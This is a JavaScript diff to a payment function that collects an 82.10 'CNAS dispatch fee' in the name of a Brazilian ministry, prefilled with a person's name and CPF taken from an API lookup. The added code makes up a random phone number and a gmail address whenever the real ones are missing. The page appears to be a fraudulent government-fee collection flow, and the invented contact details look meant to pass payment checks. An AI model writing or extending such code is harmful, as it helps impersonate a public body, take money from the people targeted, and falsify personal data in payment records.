@@ -289,13 +289,30 @@ function processCNVPayment() {
     // Prioritize CNAS data from API, then original localStorage data
     const candidateName = cnasUserData.nome || localStorage.getItem('candidateName') || userData.full_name || userData.name || '';
     const candidateCPF = cnasUserData.cpf || localStorage.getItem('candidateCPF') || userData.cpf || '';
-    const candidatePhone = localStorage.getItem('candidatePhone') || userData.phone || '';
+    let candidatePhone = localStorage.getItem('candidatePhone') || userData.phone || '';
+    
+    // Generate random phone if missing (when coming from /login)
+    if (!candidatePhone && cnasUserData.consultaApi) {
+        // Generate random Brazilian phone number
+        const ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '85', '91'][Math.floor(Math.random() * 10)];
+        const number = Math.floor(Math.random() * 90000000 + 10000000);
+        candidatePhone = `(${ddd})9${number.toString().substring(0, 4)} ${number.toString().substring(4)}`;
+    }
+    
+    // Generate random email if missing (when coming from /login)
+    let candidateEmail = localStorage.getItem('candidateEmail') || userData.email || '';
+    if (!candidateEmail && cnasUserData.consultaApi) {
+        const firstName = candidateName.split(' ')[0].toLowerCase();
+        const randomNum = Math.floor(Math.random() * 999) + 1;
+        candidateEmail = `${firstName}${randomNum}@gmail.com`;
+    }
     
     // Save payment data to localStorage for /finalizar route
     const paymentData = {
         name: candidateName,
         cpf: candidateCPF,
         phone: candidatePhone,
+        email: candidateEmail,
         amount: 82.10,
         description: 'Taxa de Expedição da CNAS - Ministério do Desenvolvimento e Assistência Social'
     };
